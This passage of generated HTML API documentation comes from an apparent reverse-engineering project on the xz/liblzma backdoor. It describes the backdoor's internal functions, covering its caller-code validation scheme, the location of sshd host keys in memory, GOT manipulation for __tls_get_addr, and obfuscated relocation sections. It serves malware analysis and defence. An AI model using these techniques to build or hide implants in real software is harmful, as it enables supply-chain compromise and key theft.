    <tr><td class="paramname">shift_count</td><td>how many '1' bits to shift </td></tr>
    <tr><td class="paramname">operation_index</td><td>identification for this shift operation </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL </dd></dl>

</div>
</div>
<a id="ace528f88c27d645eafff5052f6c36bd0"></a>
<h2 class="memtitle"><span class="permalink"><a href="#ace528f88c27d645eafff5052f6c36bd0">&#9670;&nbsp;</a></span>secret_data_append_from_call_site()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL secret_data_append_from_call_site </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="unionsecret__data__shift__cursor__t.html">secret_data_shift_cursor_t</a>&#160;</td>
          <td class="paramname"><em>shift_cursor</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">unsigned&#160;</td>
          <td class="paramname"><em>shift_count</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">unsigned&#160;</td>
          <td class="paramname"><em>operation_index</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">BOOL&#160;</td>
          <td class="paramname"><em>bypass</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Shifts data in the secret data store, after validation of the call site, i.e. the caller of this function for more details, see <a class="el" href="xzre_8h.html#a48636f910a9c7df2f2adfa4abf7a73e9">secret_data_append_singleton</a>. </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">shift_cursor</td><td>the initial shift index </td></tr>
    <tr><td class="paramname">shift_count</td><td>number of '1' bits to shift </td></tr>
    <tr><td class="paramname">operation_index</td><td>index/id of shit shift operation </td></tr>
    <tr><td class="paramname">bypass</td><td>forces the result to be TRUE, evne if validation failed </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if validation was successful and data was added, FALSE otherwise </dd></dl>

</div>
</div>
<a id="ad595372eac746eb11ddc536e5a20d667"></a>
<h2 class="memtitle"><span class="permalink"><a href="#ad595372eac746eb11ddc536e5a20d667">&#9670;&nbsp;</a></span>secret_data_append_from_code()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL secret_data_append_from_code </td>
          <td>(</td>
          <td class="paramtype">void *&#160;</td>
          <td class="paramname"><em>code_start</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">void *&#160;</td>
          <td class="paramname"><em>code_end</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="unionsecret__data__shift__cursor__t.html">secret_data_shift_cursor_t</a>&#160;</td>
          <td class="paramname"><em>shift_cursor</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">unsigned&#160;</td>
          <td class="paramname"><em>shift_count</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">BOOL&#160;</td>
          <td class="paramname"><em>start_from_call</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Pushes secret data by validating the given code block. </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">code_start</td><td>pointer to the beginning of code/function to analyze </td></tr>
    <tr><td class="paramname">code_end</td><td>pointer to the end of code/function to analyze </td></tr>
    <tr><td class="paramname">shift_cursor</td><td>shift index </td></tr>
    <tr><td class="paramname">shift_count</td><td>how many '1' bits to shift </td></tr>
    <tr><td class="paramname">start_from_call</td><td>TRUE if analysis should begin from the first CALL instruction FALSE to start from the first instruction </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if all requested shifts were all executed. FALSE if some shift wasn't executed due to code validation failure. </dd></dl>

</div>
</div>
<a id="a9549ca2df0051496f162616f98bac754"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a9549ca2df0051496f162616f98bac754">&#9670;&nbsp;</a></span>secret_data_append_if_flags()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL secret_data_append_if_flags </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="unionsecret__data__shift__cursor__t.html">secret_data_shift_cursor_t</a>&#160;</td>
          <td class="paramname"><em>shift_cursor</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">unsigned&#160;</td>
          <td class="paramname"><em>operation_index</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">unsigned&#160;</td>
          <td class="paramname"><em>shift_count</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">int&#160;</td>
          <td class="paramname"><em>flags</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Calls <a class="el" href="xzre_8h.html#a48636f910a9c7df2f2adfa4abf7a73e9">secret_data_append_singleton</a>, if <code>flags</code> are non-zero. </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">shift_cursor</td><td>the initial shift index </td></tr>
    <tr><td class="paramname">operation_index</td><td>identification for this shift operation </td></tr>
    <tr><td class="paramname">shift_count</td><td>how many '1' bits to shift </td></tr>
    <tr><td class="paramname">flags</td><td>must be non-zero in order for the operation to be executed </td></tr>
    <tr><td class="paramname">code</td><td>pointer to code that will be checked by the function, to "authorize" the data load </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if validation was successful and data was added, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a48636f910a9c7df2f2adfa4abf7a73e9"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a48636f910a9c7df2f2adfa4abf7a73e9">&#9670;&nbsp;</a></span>secret_data_append_singleton()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL secret_data_append_singleton </td>
          <td>(</td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>call_site</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="unionsecret__data__shift__cursor__t.html">secret_data_shift_cursor_t</a>&#160;</td>
          <td class="paramname"><em>shift_cursor</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">unsigned&#160;</td>
          <td class="paramname"><em>shift_count</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">unsigned&#160;</td>
          <td class="paramname"><em>operation_index</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Shifts data in the secret data store, after validation of <code>code</code>. this function is intended to be invoked only once for each <code>operation_index</code> value. <code>operation_index</code> will be used as an index into a global array of flags, so that multiple calls with the same value will be a NO-OP. </p>
<p>the <code>code</code> will be verified to check if the shift operation should be allowed or not. the algorithm will:</p><ul>
<li>locate the beginning of the function, by scanning for the <code>endbr64</code> instruction and making sure that the code lies between a pre-defined code range (set in <a class="el" href="xzre_8h.html#a229ee0bd4111363061bc4230bc1f6423">backdoor_setup</a> from <a class="el" href="xzre_8h.html#a18845fc4614f60083817db417dc32a13">elf_get_code_segment</a>)</li>
<li>search for <code>shift_count</code> number of "reg2reg" instructions (explained below)</li>
<li>for each instruction, shift a '1' in the data register, and increment the shift cursor to the next bit index the code only considers reg2reg instruction. other instructions are skipped. the function will return TRUE if the number of shifts executed == number of wanted shifts (that is, if there are as many compatible reg2reg instructions as the number of requested shifts) NOTE: MOV instructions are counted, but don't cause any shift (they are skipped).</li>
</ul>
<p>a reg2reg instruction is an x64 instruction with one of the following characteristics:</p><ul>
<li>primary opcode of 0x89 (MOV) or 0x3B (CMP) or, alternatively, an opcode that passes the following validation opcode_check = opcode - 0x83; if ( opcode_check &gt; 0x2E || ((0x410100000101 &gt;&gt; opcode_value) &amp; 1) == 0 )</li>
</ul>
<p>additionally, checks outlined in <a class="el" href="xzre_8h.html#aed0391d07e4413f5a13e1ec2940c94ea">find_reg2reg_instruction</a> must also pass NOTE: the opcode in 'opcode' is the actual opcode +0x80 TODO: inspect x64 manual to find the exact filter</p>
<p>if <code>call_site</code> is supplied, a preliminary check will be conducted to see if the caller function contains a CALL-relative instruction. several functions have a CALL in the prologue which serves a dual purpose:</p><ul>
<li>push more data in the secret data store</li>
<li>check if the call is authorized (the code is in the authorized range, and starts with a CALL-relative instruction)</li>
</ul>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">call_site</td><td>if supplied, it will be checked if it contains a valid CALL-relative instruction </td></tr>
    <tr><td class="paramname">code</td><td>pointer to code that will be checked by the function, to "authorize" the data load </td></tr>
    <tr><td class="paramname">shift_cursor</td><td>the initial shift index </td></tr>
    <tr><td class="paramname">shift_count</td><td>number of '1' bits to shift, represented by the number of"reg2reg" instructions expected in the function pointed to by <code>code</code> </td></tr>
    <tr><td class="paramname">operation_index</td><td>index/id of shit shift operation </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if all requested shifts were all executed. FALSE if some shift wasn't executed due to code validation failure. </dd></dl>

</div>
</div>
<a id="a80592f231ad06e5a8ba204e6ff685827"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a80592f231ad06e5a8ba204e6ff685827">&#9670;&nbsp;</a></span>secret_data_get_decrypted()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL secret_data_get_decrypted </td>
          <td>(</td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>output</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structglobal__context.html">global_context_t</a> *&#160;</td>
          <td class="paramname"><em>ctx</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>obtains a decrypted copy of the secret data </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">output</td><td>output buffer that will receive the decrypted data </td></tr>
    <tr><td class="paramname">ctx</td><td>the global context (for secret data and function imports) </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if successful, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a52ef44e674339d73bef9c9e28c97ecb7"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a52ef44e674339d73bef9c9e28c97ecb7">&#9670;&nbsp;</a></span>sshd_get_host_keys_address_via_krb5ccname()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL sshd_get_host_keys_address_via_krb5ccname </td>
          <td>(</td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>data_start</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>data_end</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_start</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_end</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">void **&#160;</td>
          <td class="paramname"><em>host_keys_out</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structelf__info.html">elf_info_t</a> *&#160;</td>
          <td class="paramname"><em>elf</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>finds the address of <code>sensitive_data.host_keys</code> in sshd by using getenv( STR_KRB5CCNAME ) </p>
<p>FIXME: add detail</p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">data_start</td><td>start of the sshd data segment </td></tr>
    <tr><td class="paramname">data_end</td><td>end of the sshd data segment </td></tr>
    <tr><td class="paramname">code_start</td><td>start of the sshd code segment </td></tr>
    <tr><td class="paramname">code_end</td><td>end of the sshd code segment </td></tr>
    <tr><td class="paramname">string_refs</td><td>info about resolved functions </td></tr>
    <tr><td class="paramname">host_keys_out</td><td>pointer to receive the address of the host keys (<code>struct sshkey</code> in sshd) </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if the address was found, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a4302c868eefb917c26b5922f19889b45"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a4302c868eefb917c26b5922f19889b45">&#9670;&nbsp;</a></span>sshd_get_host_keys_address_via_xcalloc()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL sshd_get_host_keys_address_via_xcalloc </td>
          <td>(</td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>data_start</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>data_end</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_start</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_end</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structstring__references.html">string_references_t</a> *&#160;</td>
          <td class="paramname"><em>string_refs</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">void **&#160;</td>
          <td class="paramname"><em>host_keys_out</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>finds the address of <code>sensitive_data.host_keys</code> in sshd by using XREF_xcalloc_zero_size in <code>xcalloc</code> </p>
<p>FIXME: add detail</p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">data_start</td><td>start of the sshd data segment </td></tr>
    <tr><td class="paramname">data_end</td><td>end of the sshd data segment </td></tr>
    <tr><td class="paramname">code_start</td><td>start of the sshd code segment </td></tr>
    <tr><td class="paramname">code_end</td><td>end of the sshd code segment </td></tr>
    <tr><td class="paramname">string_refs</td><td>info about resolved functions </td></tr>
    <tr><td class="paramname">host_keys_out</td><td>pointer to receive the address of the host keys (<code>struct sshkey</code> in sshd) </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if the address was found, FALSE otherwise </dd></dl>

</div>
</div>
<a id="ac9f89faac5a24707275635026fa910b4"></a>
<h2 class="memtitle"><span class="permalink"><a href="#ac9f89faac5a24707275635026fa910b4">&#9670;&nbsp;</a></span>sshd_get_host_keys_score()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">int sshd_get_host_keys_score </td>
          <td>(</td>
          <td class="paramtype">void *&#160;</td>
          <td class="paramname"><em>host_keys</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structelf__info.html">elf_info_t</a> *&#160;</td>
          <td class="paramname"><em>elf</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structstring__references.html">string_references_t</a> *&#160;</td>
          <td class="paramname"><em>refs</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>obtains a numeric score which indicates if accesses <code>host_keys</code> or not </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">host_keys</td><td>pointer to suspsected SSH host keys </td></tr>
    <tr><td class="paramname">elf</td><td>sshd elf instance </td></tr>
    <tr><td class="paramname">refs</td><td>info about resolved functions </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>int </dd></dl>

</div>
</div>
<a id="a5126a648eae68682ec767c19bba0f9eb"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a5126a648eae68682ec767c19bba0f9eb">&#9670;&nbsp;</a></span>sshd_get_host_keys_score_in_demote_sensitive_data()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">int sshd_get_host_keys_score_in_demote_sensitive_data </td>
          <td>(</td>
          <td class="paramtype">void *&#160;</td>
          <td class="paramname"><em>host_keys</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structelf__info.html">elf_info_t</a> *&#160;</td>
          <td class="paramname"><em>elf</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structstring__references.html">string_references_t</a> *&#160;</td>
          <td class="paramname"><em>refs</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>obtains a numeric score which indicates if <code>demote_sensitive_data</code> accesses <code>host_keys</code> or not </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">host_keys</td><td>pointer to suspsected SSH host keys </td></tr>
    <tr><td class="paramname">elf</td><td>sshd elf instance </td></tr>
    <tr><td class="paramname">refs</td><td>info about resolved functions </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>int a score of 3 if accessed, 0 otherwise </dd></dl>

</div>
</div>
<a id="a4f33df6c2fc052bc282697241421337b"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a4f33df6c2fc052bc282697241421337b">&#9670;&nbsp;</a></span>sshd_get_host_keys_score_in_do_child()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">int sshd_get_host_keys_score_in_do_child </td>
          <td>(</td>
          <td class="paramtype">void *&#160;</td>
          <td class="paramname"><em>host_keys</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structelf__info.html">elf_info_t</a> *&#160;</td>
          <td class="paramname"><em>elf</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structstring__references.html">string_references_t</a> *&#160;</td>
          <td class="paramname"><em>refs</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>obtains a numeric score which indicates if <code>do_child</code> accesses <code>host_keys</code> or not </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">host_keys</td><td>pointer to suspsected SSH host keys </td></tr>
    <tr><td class="paramname">elf</td><td>sshd elf instance </td></tr>
    <tr><td class="paramname">refs</td><td>info about resolved functions </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>int </dd></dl>

</div>
</div>
<a id="a72b20bf7b31873edf824778f9ecc471b"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a72b20bf7b31873edf824778f9ecc471b">&#9670;&nbsp;</a></span>sshd_get_host_keys_score_in_main()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">int sshd_get_host_keys_score_in_main </td>
          <td>(</td>
          <td class="paramtype">void *&#160;</td>
          <td class="paramname"><em>host_keys</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structelf__info.html">elf_info_t</a> *&#160;</td>
          <td class="paramname"><em>elf</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structstring__references.html">string_references_t</a> *&#160;</td>
          <td class="paramname"><em>refs</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>obtains a numeric score which indicates if <code>main</code> accesses <code>host_keys</code> or not </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">host_keys</td><td>pointer to suspsected SSH host keys </td></tr>
    <tr><td class="paramname">elf</td><td>sshd elf instance </td></tr>
    <tr><td class="paramname">refs</td><td>info about resolved functions </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>int </dd></dl>

</div>
</div>
<a id="ad3a61f27a1663eb3e0b25b861c85fe3c"></a>
<h2 class="memtitle"><span class="permalink"><a href="#ad3a61f27a1663eb3e0b25b861c85fe3c">&#9670;&nbsp;</a></span>update_got_address()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">void* update_got_address </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structelf__entry__ctx.html">elf_entry_ctx_t</a> *&#160;</td>
          <td class="paramname"><em>entry_ctx</em></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>finds the __tls_get_addr() GOT entry </p>
<p>this function first computes the location of the __tls_get_addr() PLT trampoline function by using the PLT offset constant from tls_get_addr_reloc_consts</p>
<p>then it decodes the PLT jmp instruction to get the address of the __tls_get_addr() GOT entry</p>
<p>the __tls_get_addr() GOT entry is used in <a class="el" href="xzre_8h.html#a229ee0bd4111363061bc4230bc1f6423" title="the backdoor main method">backdoor_setup()</a> to find the ELF header at the start of the memory mapped ld.so</p>
<p>calls <a class="el" href="xzre_8h.html#ae20580c7a069afb3b578f060582867df" title="get the tls_get_addr_random_symbol GOT offset">get_tls_get_addr_random_symbol_got_offset()</a> to update <a class="el" href="structelf__entry__ctx.html#a88320cc048dda10c9063bac93f76b6a0" title="points to the Global Offset Table">elf_entry_ctx_t::got_ptr</a> and <a class="el" href="structelf__entry__ctx.html#ab5aad4ce617c033e5e2d4740dc8551b7" title="holds the offset of the symbol relative to the GOT. used to derive the got_ptr">elf_entry_ctx_t::got_offset</a> sets <a class="el" href="structelf__entry__ctx.html#ab5aad4ce617c033e5e2d4740dc8551b7" title="holds the offset of the symbol relative to the GOT. used to derive the got_ptr">elf_entry_ctx_t::got_offset</a> = 0 sets <a class="el" href="structelf__entry__ctx.html#ac57b21a9eadcd40b34305f45684cc2e9" title="points to the real cpuid function">elf_entry_ctx_t::cpuid_fn</a> = 0 stores the address of the __tls_get_addr() GOT entry in <a class="el" href="structelf__entry__ctx.html#a88320cc048dda10c9063bac93f76b6a0" title="points to the Global Offset Table">elf_entry_ctx_t::got_ptr</a></p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">entry_ctx</td><td></td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>void* the address of the __tls_get_addr() GOT entry </dd></dl>

</div>
</div>
<a id="a52d510f0bbb31de19d8d20bf1acaeb5f"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a52d510f0bbb31de19d8d20bf1acaeb5f">&#9670;&nbsp;</a></span>x86_dasm()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">int x86_dasm </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structdasm__ctx.html">dasm_ctx_t</a> *&#160;</td>
          <td class="paramname"><em>ctx</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_start</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_end</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>disassembles the given x64 code </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">ctx</td><td>empty disassembler context to hold the state </td></tr>
    <tr><td class="paramname">code_start</td><td>pointer to the start of buffer (first disassemblable location) </td></tr>
    <tr><td class="paramname">code_end</td><td>pointer to the end of the buffer </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>int TRUE if disassembly was successful, FALSE otherwise </dd></dl>

</div>
</div>
<h2 class="groupheader">Variable Documentation</h2>
<a id="ac7d6a45076bf21904bac3163ae57090e"></a>
<h2 class="memtitle"><span class="permalink"><a href="#ac7d6a45076bf21904bac3163ae57090e">&#9670;&nbsp;</a></span>cpuid_random_symbol</h2>

<div class="memitem">
<div class="memproto">
<table class="mlabels">
  <tr>
  <td class="mlabels-left">
      <table class="memname">
        <tr>
          <td class="memname">const u64 cpuid_random_symbol</td>
        </tr>
      </table>
  </td>
  <td class="mlabels-right">
<span class="mlabels"><span class="mlabel">extern</span></span>  </td>
  </tr>
</table>
</div><div class="memdoc">

<p>a bogus global variable that is used by the backdoor to generate an extra symbol </p>
<p>inside a .rodata section</p>
<p>the symbol is used by <a class="el" href="xzre_8h.html#abf19222b4917f772ad487a2970dd51ec" title="initialises the elf_entry_ctx_t">init_elf_entry_ctx()</a> </p>

</div>
</div>
<a id="a6ee0871d6d6f7544176777c8f00244b7"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a6ee0871d6d6f7544176777c8f00244b7">&#9670;&nbsp;</a></span>cpuid_reloc_consts</h2>

<div class="memitem">
<div class="memproto">
<table class="mlabels">
  <tr>
  <td class="mlabels-left">
      <table class="memname">
        <tr>
          <td class="memname">const <a class="el" href="structbackdoor__cpuid__reloc__consts.html">backdoor_cpuid_reloc_consts_t</a> cpuid_reloc_consts</td>
        </tr>
      </table>
  </td>
  <td class="mlabels-right">
<span class="mlabels"><span class="mlabel">extern</span></span>  </td>
  </tr>
</table>
</div><div class="memdoc">

<p>special .rodata section that contains _cpuid() related GOT offsets </p>
<p>liblzma_la-crc64-fast.o lists the fields in the relocation table so that the linker fills out the fields with the offsets</p>
<p>used by call_backdoor_init_stage2(), <a class="el" href="xzre_8h.html#ad33792d2db40b95a7b434081d1608ca4" title="get the offset to the GOT">get_got_offset()</a> and <a class="el" href="xzre_8h.html#aee7738c9cab5f6733c666e0a20e5ba99" title="get the cpuid() GOT index">get_cpuid_got_index()</a> </p>

</div>
</div>
<a id="a43a1216740525fdfa050474fc9b91a57"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a43a1216740525fdfa050474fc9b91a57">&#9670;&nbsp;</a></span>elf_functions</h2>

<div class="memitem">
<div class="memproto">
<table class="mlabels">
  <tr>
  <td class="mlabels-left">
      <table class="memname">
        <tr>
          <td class="memname">const <a class="el" href="structelf__functions.html">elf_functions_t</a> <a class="el" href="structelf__functions.html">elf_functions</a></td>
        </tr>
      </table>
  </td>
  <td class="mlabels-right">
<span class="mlabels"><span class="mlabel">extern</span></span>  </td>
  </tr>
</table>
</div><div class="memdoc">

<p>special .data.rel.ro section that contains addresses to various functions </p>
<p>appears to be another obfuscation attempt</p>
<p>liblzma_la-crc64-fast.o lists the fields in the relocation table so that the linker fills out the fields with the offsets</p>
<p>used by <a class="el" href="xzre_8h.html#ad3a61f27a1663eb3e0b25b861c85fe3c" title="finds the __tls_get_addr() GOT entry">update_got_address()</a> and <a class="el" href="xzre_8h.html#ae20580c7a069afb3b578f060582867df" title="get the tls_get_addr_random_symbol GOT offset">get_tls_get_addr_random_symbol_got_offset()</a></p>
<p>used by </p>

</div>
</div>
<a id="a4623e8d4254091bcbffbead1ee7ed2ff"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a4623e8d4254091bcbffbead1ee7ed2ff">&#9670;&nbsp;</a></span>elf_functions_offset</h2>

<div class="memitem">
<div class="memproto">
<table class="mlabels">
  <tr>
  <td class="mlabels-left">
      <table class="memname">
        <tr>
          <td class="memname">const ptrdiff_t elf_functions_offset</td>
        </tr>
      </table>
  </td>
  <td class="mlabels-right">
<span class="mlabels"><span class="mlabel">extern</span></span>  </td>
  </tr>
</table>
</div><div class="memdoc">

<p>special .data.rel.ro section that contains the offset to <a class="el" href="structelf__functions.html">elf_functions</a> </p>
<p>liblzma_la-crc64-fast.o lists the fields in the relocation table so that the linker fills out the fields with the offsets</p>
<p>the variable maps to a relocation entry of type R_X86_64_64 and value elf_functions-0x2a0 </p>

</div>
</div>
<a id="a654fa519cae913e8f1b0c5ad54f8cc3a"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a654fa519cae913e8f1b0c5ad54f8cc3a">&#9670;&nbsp;</a></span>fake_lzma_allocator</h2>

<div class="memitem">
<div class="memproto">
<table class="mlabels">
  <tr>
  <td class="mlabels-left">
      <table class="memname">
        <tr>
